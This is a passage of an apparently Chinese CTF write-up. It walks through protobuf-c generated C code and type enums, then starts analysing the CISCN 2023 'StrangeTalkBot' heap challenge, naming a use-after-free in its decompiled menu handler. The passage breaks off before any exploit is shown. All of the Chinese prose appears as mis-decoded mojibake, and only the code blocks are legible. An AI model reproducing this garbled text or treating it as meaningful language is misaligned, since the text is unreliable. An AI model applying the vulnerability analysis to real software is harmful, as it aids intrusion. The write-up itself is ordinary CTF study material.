class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span></span><br><span class="line"><span class="comment">/* Generated from: test.proto */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Do not generate deprecated warnings for self */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PROTOBUF_C__NO_DEPRECATED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTOBUF_C__NO_DEPRECATED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;test.pb-c.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__init</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test         *message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> Test init_value = TEST__INIT;</span><br><span class="line">  *message = init_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__get_packed_size</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test *message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_get_packed_size ((<span class="keyword">const</span> ProtobufCMessage*)(message));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">uint8_t</span>       *out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_pack ((<span class="keyword">const</span> ProtobufCMessage*)message, out);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack_to_buffer</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCBuffer *buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_pack_to_buffer ((<span class="keyword">const</span> ProtobufCMessage*)message, buffer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Test *</span></span><br><span class="line"><span class="function">       <span class="title">test__unpack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">size_t</span>               len,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">const</span> <span class="keyword">uint8_t</span>       *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (Test *)</span><br><span class="line">     protobuf_c_message_unpack (&amp;test__descriptor,</span><br><span class="line">                                allocator, len, data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__free_unpacked</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCAllocator *allocator)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!message)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  protobuf_c_message_free_unpacked ((ProtobufCMessage*)message, allocator);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> ProtobufCFieldDescriptor test__field_descriptors[<span class="number">4</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;aaa&quot;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_INT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, aaa),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;bbb&quot;</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_UINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, bbb),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ccc&quot;</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, ccc),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ddd&quot;</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_BYTES,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, ddd),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> test__field_indices_by_name[] = &#123;</span><br><span class="line">  <span class="number">0</span>,   <span class="comment">/* field[0] = aaa */</span></span><br><span class="line">  <span class="number">1</span>,   <span class="comment">/* field[1] = bbb */</span></span><br><span class="line">  <span class="number">2</span>,   <span class="comment">/* field[2] = ccc */</span></span><br><span class="line">  <span class="number">3</span>,   <span class="comment">/* field[3] = ddd */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> ProtobufCIntRange test__number_ranges[<span class="number">1</span> + <span class="number">1</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123; <span class="number">1</span>, <span class="number">0</span> &#125;,</span><br><span class="line">  &#123; <span class="number">0</span>, <span class="number">4</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> ProtobufCMessageDescriptor test__descriptor =</span><br><span class="line">&#123;</span><br><span class="line">  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,</span><br><span class="line">  <span class="string">&quot;test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="keyword">sizeof</span>(Test),</span><br><span class="line">  <span class="number">4</span>,</span><br><span class="line">  test__field_descriptors,</span><br><span class="line">  test__field_indices_by_name,</span><br><span class="line">  <span class="number">1</span>,  test__number_ranges,</span><br><span class="line">  (ProtobufCMessageInit) test__init,</span><br><span class="line">  <span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved[123] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–‡ä»¶å°±æ˜¯<code>test.pb-c.c</code>æ–‡ä»¶ï¼Œå†…éƒ¨å¯¹<code>test__field_descriptors</code>æ•°ç»„è¿›è¡Œäº†å¤åˆ¶ï¼Œè¿™é‡Œä½¿ç”¨çš„ç»“æ„ä½“ä¸º<code>ProtobufCFieldDescriptor</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>*name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line"><span class="keyword">uint32_t</span>id;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">ProtobufCLabellabel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The type of the field. */</span></span><br><span class="line">ProtobufCTypetype;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment"> * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment"> * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span>quantifier_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment"> * itself.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span>offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A type-specific descriptor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment"> * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment"> * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">void</span>*descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">void</span>*default_value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment"> * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">uint32_t</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="keyword">unsigned</span>reserved_flags;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="keyword">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="keyword">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªç»“æ„ä½“ä¸­çš„typeå°±æ˜¯æ•°æ®çš„ç±»å‹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨<code>proto</code>æ–‡ä»¶ä¸­ï¼Œåˆ†åˆ«å®šä¹‰äº†<code>int64</code>å’Œ<code>sint64</code>è™½ç„¶ç»“æ„ä½“ä¸­éƒ½è¢«ç¿»è¯‘æˆäº†<code>int64_t</code>ç±»å‹ï¼Œä½†æ˜¯å¯ä»¥åœ¨<code>test.pb-c.c</code>æ–‡ä»¶ä¸­çœ‹åˆ°ï¼Œä»–ä»¬åœ¨ä¸Šè¿°ç»“æ„ä½“ä¸­çš„typeå€¼æ˜¯ä¸ä¸€æ ·çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">PROTOBUF_C_TYPE_INT32,      <span class="comment">/**&lt; int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**&lt; signed int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**&lt; signed int32 (4 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_INT64,      <span class="comment">/**&lt; int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**&lt; signed int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**&lt; signed int64 (8 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**&lt; unsigned int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**&lt; unsigned int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**&lt; float */</span></span><br><span class="line">PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**&lt; double */</span></span><br><span class="line">PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**&lt; boolean */</span></span><br><span class="line">PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**&lt; enumerated type */</span></span><br><span class="line">PROTOBUF_C_TYPE_STRING,     <span class="comment">/**&lt; UTF-8 or ASCII string */</span></span><br><span class="line">PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**&lt; arbitrary byte sequence */</span></span><br><span class="line">PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**&lt; nested message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure><p>è€Œè¿™é‡Œtypeå€¼çš„å®šä¹‰æ˜¯è¿™æ ·çš„ï¼ŒçŸ¥é“è¿™ä¸ªå¾ˆé‡è¦ï¼Œåœ¨åç»­çš„åšé¢˜ç¯èŠ‚ä¸­éœ€è¦ã€‚</p><p>ç„¶è€Œï¼Œè¿™ç§é¢˜ç›®ä¸€èˆ¬æ¥è¯´éƒ½æ˜¯ç”¨æˆ·æ€çš„é¢˜ç›®ï¼Œè€Œé¢å¯¹ç”¨æˆ·æ€é¢˜ç›®æˆ‘ä»¬å†™çš„è„šæœ¬æ›´å¤šçš„æ˜¯ä½¿ç”¨<code>python</code>å»å†™ï¼Œè¿™é‡ŒåŒæ ·å¯ä»¥ä½¿ç”¨<code>protoc</code>å·¥å…·ç”Ÿæˆ<code>python</code>æ–‡ä»¶å¯ä»¥å¼•å…¥çš„æ–‡ä»¶ã€‚å‘½ä»¤ä¸º:<code>protoc --python_out=. ./test.proto</code></p><h2 id="StrangeTalkBot"><a href="#StrangeTalkBot" class="headerlink" title="StrangeTalkBot"></a>StrangeTalkBot</h2><p>è¿™é“é¢˜æ˜¯ciscn2023çš„ç¬¬äºŒé“pwné¢˜ã€‚</p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> v3; <span class="comment">// rsi</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init_io();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;byte_A060, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can try to have friendly communication with me now: &quot;</span>);</span><br><span class="line">    v3 = read(<span class="number">0</span>, &amp;byte_A060, <span class="number">0x400</span>uLL);</span><br><span class="line">    v4 = (_QWORD *)sub_192D(<span class="number">0LL</span>, v3, &amp;byte_A060);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_155D(v4[<span class="number">3</span>], v4[<span class="number">4</span>], v4[<span class="number">5</span>], v4[<span class="number">6</span>], v4[<span class="number">7</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  errExit(<span class="number">0LL</span>, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œé¢˜ç›®ä¸»å¹²æ¯”è¾ƒæ¸…æ™°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">sub_155D</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 opt,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">unsigned</span> __int64 idx,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 chunk_size,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 content_size,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">const</span> <span class="keyword">void</span> *content)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  size = chunk_size;</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= <span class="number">0x21</span> )</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)content_size &gt;= <span class="number">0xF1</span> )</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)chunk_size &gt;= <span class="number">0xF1</span> )</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">if</span> ( chunk_size &lt; content_size )</span><br><span class="line">    size = content_size;</span><br><span class="line">  <span class="keyword">if</span> ( opt == <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">delete</span>(idx);</span><br><span class="line">  <span class="keyword">if</span> ( opt &gt; <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">  <span class="keyword">if</span> ( opt == <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">char</span> *)show(idx);</span><br><span class="line">  <span class="keyword">if</span> ( opt == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">char</span> *)create(idx, size, content_size, content);</span><br><span class="line">  <span class="keyword">if</span> ( opt != <span class="number">2</span> )</span><br><span class="line">LABEL_19:</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">char</span> *)edit(idx, content_size, content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œåœ¨è¿™ä¸ªå‡½æ•°å†…éƒ¨å…¶å®å°±æ˜¯å¾ˆç»å…¸çš„èœå•ç±»å †é¢˜ï¼Œå¹¶ä¸”é¢˜ç›®ä¸­çš„æ¼æ´ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªå¾ˆå•çº¯çš„UAFã€‚éº»çƒ¦çš„æ˜¯<code>sub_192D</code>å‡½æ•°å†…éƒ¨çš„<code>sub_5090</code>æœ‰å¾ˆé•¿çš„ä»£ç ã€‚è™½ç„¶æˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆçŒœçš„ï¼Œä½†æ˜¯ä»–å°±æ˜¯<code>protobuf</code>å¯¹åº”çš„<code>unpack</code>å‡½æ•°ã€‚</p><h3 id="ç†è§£é¢˜ç›®ä¸­çš„protobuf"><a href="#ç†è§£é¢˜ç›®ä¸­çš„protobuf" class="headerlink" title="ç†è§£é¢˜ç›®ä¸­çš„protobuf"></a>ç†è§£é¢˜ç›®ä¸­çš„protobuf</h3><p>éœ€è¦ç†è§£çš„è¯ï¼Œé¦–å…ˆå°±æ˜¯éœ€è¦ç¡®å®šé¢˜ç›®ä¸­å„ä¸ªå‡½æ•°çš„å«ä¹‰ä»¥åŠéƒ¨åˆ†å¯èƒ½éœ€è¦çŸ¥é“çš„ç»“æ„ä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_192D</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_5090(&amp;unk_9C80, a1, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°å†…éƒ¨åªæ˜¯è°ƒç”¨äº†å¦å¤–ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”è¿”å›å‡ºå¦å¤–å‡½æ•°çš„è¿”å›å€¼ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">sub_5090</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">const</span> ProtobufCMessageDescriptor *desc,</span></span></span><br><span class="line"><span class="params"><span class="function">        ProtobufCAllocator *a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">unsigned</span> __int64 count,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">unsigned</span> __int8 *content)</span></span></span><br></pre></td></tr></table></figure><p>ç„¶è€Œè¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªæŒ‡é’ˆ(å‚æ•°çš„ç±»å‹éƒ½æ˜¯å·²ç»ç»è¿‡äº†æˆ‘çš„ä¿®æ”¹äº†)ã€‚å…¶å®é€šè¿‡å¯¹æ¯”å¯ä»¥å‘ç°ç»“æ„å¾ˆç±»ä¼¼ä¸Šè¿°ä¸­çš„<code>unpack</code>å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Test *<span class="title">test__unpack</span><span class="params">(ProtobufCAllocator  *allocator, <span class="keyword">size_t</span> len, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (Test *) protobuf_c_message_unpack (&amp;test__descriptor, allocator, len, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œå¯ä»¥é€šè¿‡æœç´¢å…¶å†…éƒ¨çš„å­—ç¬¦ä¸²</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">actionid_str = desc-&gt;fields_sorted_by_name;</span><br><span class="line">canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="keyword">if</span> ( desc-&gt;magic != <span class="number">0x28AAEEF9</span> )</span><br><span class="line">  __assert_fail(</span><br><span class="line">  <span class="string">&quot;(desc)-&gt;magic == BINARYBF_C__MESSAGE_DESCRIPTOR_MAGIC&quot;</span>,</span><br><span class="line">  <span class="string">&quot;BINARYBF-c/BINARYBF-c.c&quot;</span>,</span><br><span class="line">  <span class="number">0xBF2</span>u,</span><br><span class="line">  <span class="string">&quot;BINARYBF_c_message_unpack&quot;</span>);</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚å‡½æ•°å¼€å¤´çš„assertå³å¯æœç´¢åˆ°å…¶æºç 